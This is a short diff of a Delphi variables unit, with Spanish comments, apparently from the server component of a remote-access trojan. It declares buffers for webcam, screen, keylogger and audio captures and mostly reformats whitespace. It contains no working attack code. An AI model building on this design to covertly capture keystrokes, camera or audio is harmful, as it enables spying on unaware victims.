@@ -5,28 +5,28 @@ unit UnitVariables;
 interface
 
 uses
-  SettingsDef, classes; //Aquí se define el record de configuracion (TSettings)
+  SettingsDef; //Aquí se define el record de configuracion (TSettings)
 
 var
   Configuracion: TSettings; //Aquí se guardaran todas las opciones editables del server.
   //Es un record que está definido en la unidad SettingsDef.
  // MS: TMemoryStream; //MS de la captura de pantalla
   VersionDelServer: array[0..5] of char;
- //Pequeña string donde se guarda la versión del servidor,
- //solo le caben 6 caracteres. Si se necesita más, hay que agrandarla.
-  Sistema_operativo, CPU: string;//Para no tener que mirar el registro cada vez que los necesitemos
+  //Pequeña string donde se guarda la versión del servidor,
+  //solo le caben 6 caracteres. Si se necesita más, hay que agrandarla.
+  Sistema_operativo, CPU: string; //Para no tener que mirar el registro cada vez que los necesitemos
 
-  StopSearch : Boolean; //Para parar de buscar
-  
-  CapturaWebcam         : string;   //Variables para el thread 
-  CapturaPantalla       : string;
-  CapturaThumb          : string;
-  CapturaKeylogger      : string;
-  CapturaAudio          : string;
-  RecordedAudio         : string;
-  pararcapturathread : boolean;
+  StopSearch: Boolean; //Para parar de buscar
 
-  id1: longword = 0;
+  CapturaWebcam: string; //Variables para el thread
+  CapturaPantalla: string;
+  CapturaThumb: string;
+  CapturaKeylogger: string;
+  CapturaAudio: string;
+  RecordedAudio: string;
+  pararcapturathread: Boolean;
+
+  id1: Longword = 0;
 implementation
 
 end.
